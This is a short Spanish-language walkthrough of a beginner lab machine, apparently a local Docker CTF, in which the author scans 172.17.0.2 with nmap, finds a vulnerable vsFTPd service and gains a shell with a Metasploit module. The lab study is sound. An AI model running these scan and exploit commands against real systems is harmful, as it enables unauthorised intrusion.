**Autor:** [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)
da
**Dificultad:** Muy Fácil

**Fecha de creación:** 14/06/2024

----------------


DESPLIEGUE 

```
bash auto_deploy.sh firsthacking.tar
```



------------


PROCEDIMIENTO

Tenemos la IP: `172.17.0.2`.

![[Pasted image 20240908233126.png]]

------------------

RECONOCIMIENTO

Hago un mapeo de esta ip 

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

![[Pasted image 20240908233541.png]]

Me sale lo siguiente, un puerto abierto por el puerto ftp 21.

Lo siguiente que he hecho es usar el script de `vuln`

```
nmap --script "vuln" -p21 172.17.0.2
```

![[Pasted image 20240908233735.png]]

Me da toda esta información. 

Entonces lo siguiente es usar `msfconsole`

```
msfconsole
```


![[Pasted image 20240908233837.png]]

He buscado por el siguiente parametro
```
search vsFTPd
```

y me sale lo siguiente: 

![[Pasted image 20240908234003.png]]

Así que el que yo quiero cargar es el 1, pues uso `use 1`

![[Pasted image 20240908234047.png]]

Pongo un

```
show options
```

![[Pasted image 20240908234142.png]]


Así que lo siguiente es : 

```
set RHOSTS 172.17.0.2
```

Una vez introducido le damos a `run` y ya estaríamos dentro de la máquina víctima.

![[Pasted image 20240908234316.png]]
